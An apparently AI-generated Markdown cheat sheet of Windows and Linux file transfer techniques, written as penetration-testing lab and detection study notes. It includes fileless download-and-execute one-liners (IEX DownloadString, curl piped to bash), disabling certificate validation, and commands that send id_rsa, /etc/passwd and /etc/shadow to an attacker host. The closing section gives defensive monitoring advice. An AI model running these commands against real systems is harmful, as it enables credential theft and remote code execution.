# Windows & Linux File Transfer Methods

> Combined reference for Windows and Linux file transfer techniques — useful for labs, incident response, and HTB CDSA study notes.

## Table of Contents
- [Introduction](#introduction)
- [Windows File Transfer Methods](#windows-file-transfer-methods)
  - [Download Operations](#windows-download-operations)
    - [PowerShell Base64 Encode/Decode](#powershell-base64-encodedecode)
    - [PowerShell Web Downloads](#powershell-web-downloads)
    - [SMB Downloads](#smb-downloads)
    - [FTP Downloads](#ftp-downloads)
  - [Upload Operations](#windows-upload-operations)
    - [PowerShell Base64 Encode](#powershell-base64-encode)
    - [PowerShell Web Upload](#powershell-web-upload)
    - [PowerShell Base64 Web Upload](#powershell-base64-web-upload)
    - [SMB Uploads / WebDAV](#smb-uploads--webdav)
    - [FTP Uploads](#ftp-uploads)
  - [Recap: Windows](#recap-windows)
- [Linux File Transfer Methods](#linux-file-transfer-methods)
  - [Download Operations](#linux-download-operations)
    - [Base64 Encoding / Decoding](#base64-encoding--decoding)
    - [Web Downloads: wget & curl](#web-downloads-wget--curl)
    - [Fileless Attacks (pipes)](#fileless-attacks-pipes)
    - [Bash /dev/tcp Method](#bash-devtcp-method)
    - [SSH / SCP Downloads](#ssh--scp-downloads)
  - [Upload Operations](#linux-upload-operations)
    - [Web Upload via uploadserver (HTTPS)](#web-upload-via-uploadserver-https)
    - [Mini Web Servers (Python/PHP/Ruby)](#mini-web-servers-pythonphpruby)
    - [SCP Upload](#scp-upload)
  - [Recap: Linux](#recap-linux)
- [Master Recap & Best Practices](#master-recap--best-practices)
- [Next Steps / Export Options](#next-steps--export-options)

---

## Introduction

This combined reference documents native and commonly used tools for file transfer on **Windows** and **Linux**. It's tailored for HTB CDSA-style labs, incident response, and teaching defensive detection. Examples include base64 transfers, HTTP(S) downloads/uploads, SMB, FTP, WebDAV, and SSH (SCP).

---

# Windows File Transfer Methods

## Download Operations

### PowerShell Base64 Encode & Decode

**Use case:** Transfer small files without network traffic (copy/paste base64).

```bash
# On Linux (encode)
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
```

```powershell
# On Windows (decode)
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",[Convert]::FromBase64String("<b64string>"))
Get-FileHash C:\Users\Public\id_rsa -Algorithm MD5
```

> ⚠️ `cmd.exe` max string length = **8191 chars**. Web shells may error on very large strings.

---

### PowerShell Web Downloads

`System.Net.WebClient` methods and `Invoke-WebRequest` are widely used.

```powershell
# Download to disk
(New-Object Net.WebClient).DownloadFile('https://url/file.ps1','C:\path\file.ps1')

# Fileless execution (runs in memory)
IEX (New-Object Net.WebClient).DownloadString('https://url/script.ps1')

# Alternative
Invoke-WebRequest https://url/script.ps1 -OutFile script.ps1
```

**Common Issues**:
- IE first-launch parsing error: use `-UseBasicParsing`
- SSL/TLS cert trust errors: bypass with
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

Helpful aliases: `iwr`, `curl`, `wget` (PowerShell 6+ compatibility)

---

### SMB Downloads

Host with Impacket's `smbserver.py` on attacker (Pwnbox):
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

From Windows target:
```cmd
copy \\192.168.220.133\share\nc.exe
```

If guest access blocked, create server with credentials:
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

---

### FTP Downloads

Run Python FTP server (`pyftpdlib`) on attacker:

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

From Windows target (PowerShell):
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt','C:\Users\Public\ftp-file.txt')
```

Non-interactive `ftp` client:
```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

## Upload Operations

### PowerShell Base64 Encode (Upload from Windows)

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5
```

Decode on Linux:
```bash
echo "<base64>" | base64 -d > hosts
md5sum hosts
```

---

### PowerShell Web Upload (uploadserver)

Install and run `uploadserver` on attacker:
```bash
pip3 install uploadserver
python3 -m uploadserver
# File upload page at http://<ip>:8000/upload
```

PowerShell upload helper (example):
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

---

### PowerShell Base64 Web Upload (POST + Netcat)

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

Catch with Netcat on attacker and decode:
```bash
nc -lvnp 8000
echo <base64> | base64 -d -w 0 > hosts
```

---

### SMB Uploads & WebDAV

If SMB is blocked externally, WebDAV is useful (SMB over HTTP). Use `wsgidav` to serve a writable HTTP/WebDAV share.

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

From Windows target:
```cmd
dir \\192.168.49.128\DavWWWRoot
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\DavWWWRoot\
```

`DavWWWRoot` is a Windows shell keyword mapping to WebDAV root.

---

### FTP Uploads

Start FTP with write permissions:
```bash
sudo python3 -m pyftpdlib --port 21 --write
```

PowerShell upload:
```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

Non-interactive ftp upload:
```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

## Recap: Windows

| Method | Direction | Protocol | Notes |
|--------|-----------|----------|-------|
| Base64 Encode/Decode | Upload & Download | None | Good for small files, copy/paste |
| PowerShell Web (WebClient / Invoke-WebRequest) | Both | 80/443 | Supports fileless execution (IEX) |
| SMB | Both | 445 | May require auth; Impacket useful |
| FTP | Both | 21/20 | Simple; scriptable |
| WebDAV | Both | 80/443 | SMB alternative over HTTP |

---

# Linux File Transfer Methods

## Download Operations

### Base64 Encoding / Decoding

**Encode on attacker (Pwnbox):**
```bash
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
```

**Decode on target:**
```bash
echo -n '<base64string>' | base64 -d > id_rsa
md5sum id_rsa
```

---

### Web Downloads: wget & cURL

```bash
# wget (save as file)
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

# curl (save as file)
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

---

### Fileless Attacks (pipes)

Run scripts directly in memory using pipes:

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

---

### Download with Bash (/dev/tcp)

If common tools missing, use Bash networking:

```bash
# open TCP fd
exec 3<>/dev/tcp/10.10.10.32/80

# HTTP GET
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3

# read response
cat <&3
```

---

### SSH / SCP Downloads

Start SSH server on attacker (Pwnbox) and use `scp` to pull files:

```bash
sudo systemctl enable --now ssh
netstat -lnpt

# From target to attacker
scp plaintext@192.168.49.128:/root/myroot.txt .
```

---

## Upload Operations

### Web Upload via uploadserver (HTTPS)

Install `uploadserver` and create self-signed cert:
```bash
sudo python3 -m pip install --user uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

Upload multiple files from target:
```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

---

### Mini Web Servers (Python / PHP / Ruby)

Quickly host files for download:

```bash
# Python3
python3 -m http.server

# Python2
python2.7 -m SimpleHTTPServer

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -ehttpd . -p8000
```

Then on attacker:
```bash
wget http://<target_ip>:8000/filetotransfer.txt
```

> Ensure inbound firewall/ACLs allow connections.

---

### SCP Upload

If SSH outbound allowed, upload using `scp`:

```bash
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

---

## Recap: Linux

| Method | Direction | Protocol | Notes |
|--------|-----------|----------|-------|
| Base64 | Both | None | Useful for constrained shells |
| wget / curl | Both | 80/443 | Common and flexible |
| /dev/tcp (Bash) | Download | 80 | No external tools required |
| SCP | Both | 22 | Encrypted; requires SSH |
| Mini web servers | Both | 80 | Easy to stand up |
| uploadserver | Both | 443 | Enables uploads over HTTPS |

---

# Master Recap & Best Practices

- **HTTP/HTTPS (80/443)** is the most permissive and commonly used channel by attackers and benign admins. Monitor web traffic for unusual downloads, long base64 blobs, or frequent script retrievals.
- **Fileless techniques** (IEX, piping to `bash`/`python`) leave fewer artifacts — monitor command-line history, process trees, and parent-child relationships.
- **Base64 transfers** often appear as long single-line strings — detect by length and base64 character distribution.
- **SMB/FTP** are noisy on the network; block outbound SMB where possible and restrict FTP. Consider egress filtering and proxying.
- **Use checksums** (`md5sum`, `Get-FileHash`) to verify integrity after transfer.
- **Prefer secure channels** (SCP, HTTPS) for legitimate file transfers and ensure proper certificate validation.

---

## Next Steps / Export Options

I saved this combined Markdown file to `/mnt/data/Windows_and_Linux_File_Transfers.md`.  
I can also export to **PDF** or **HTML**, or add collapsible details per-method (GitHub/Obsidian friendly).

